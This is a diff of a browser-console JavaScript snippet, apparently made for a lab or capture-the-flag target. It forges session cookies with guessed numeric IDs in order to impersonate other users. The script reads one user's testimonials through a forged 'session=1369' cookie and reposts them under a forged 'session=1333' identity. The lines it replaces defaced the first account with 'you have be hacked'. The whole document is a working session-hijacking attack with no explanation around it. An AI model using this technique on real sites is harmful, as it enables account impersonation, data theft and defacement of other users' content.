@@ -1,12 +1,48 @@
-(async function postAndGet1369() {
+(async function transferTestimonials() {
     
-    // Force session cookie to 1369
+    console.log("🚀 Starting transfer from 1369 to 1333...");
+
+    // Force session=1369
     document.cookie = "session=1369; path=/";
+    await new Promise(r => setTimeout(r, 500));
 
-    await new Promise(r => setTimeout(r, 400));
+    // ==================== 1. GET All Testimonials from 1369 ====================
+    let allTestimonials = [];
+    
+    try {
+        const res = await fetch('/api/testimonials', {
+            method: 'GET',
+            credentials: 'include'
+        });
 
-    // ==================== POST Testimonial to 1369 ====================
-    console.log("📤 Posting testimonial with session=1369...");
+        if (res.ok) {
+            allTestimonials = await res.json();
+            console.log(`✅ Fetched ${allTestimonials.length || 1} testimonial(s) from 1369`);
+        }
+    } catch (e) {
+        console.error("Failed to fetch testimonials", e);
+    }
+
+    // Combine all testimonials into one string
+    let combinedContent = "No testimonials found";
+
+    if (Array.isArray(allTestimonials) && allTestimonials.length > 0) {
+        combinedContent = allTestimonials
+            .map(item => {
+                if (typeof item === 'string') return item;
+                if (item && item.content) return item.content;
+                return JSON.stringify(item);
+            })
+            .join(" | ");
+    } else if (allTestimonials && allTestimonials.content) {
+        combinedContent = allTestimonials.content;
+    }
+
+    // ==================== 2. POST Combined Content to 1333 ====================
+    document.cookie = "session=1333; path=/";
+    await new Promise(r => setTimeout(r, 500));
+
+    console.log("📤 Posting combined testimonials to session=1333...");
 
     await fetch('/api/testimonials', {
         method: 'POST',
@@ -16,7 +52,7 @@
         },
         credentials: 'include',
         body: JSON.stringify({ 
-            content: "you have be hacked" 
+            content: combinedContent 
         })
     })
     .then(r => {
@@ -26,25 +62,6 @@
     .then(text => console.log("POST Response:", text))
     .catch(err => console.error("POST Error:", err));
 
-    // Small delay
-    await new Promise(r => setTimeout(r, 800));
-
-    // ==================== GET Testimonials of 1369 ====================
-    console.log("📥 Fetching testimonials for session=1369...");
-
-    fetch('/api/testimonials', {
-        method: 'GET',
-        credentials: 'include'
-    })
-    .then(r => {
-        console.log("GET Status:", r.status);
-        return r.json();
-    })
-    .then(data => {
-        console.log("✅ Testimonials received:");
-        console.log(data);
-        console.table(data);
-    })
-    .catch(err => console.error("GET Error:", err));
+    console.log("✅ Transfer Completed!");
 
 })();
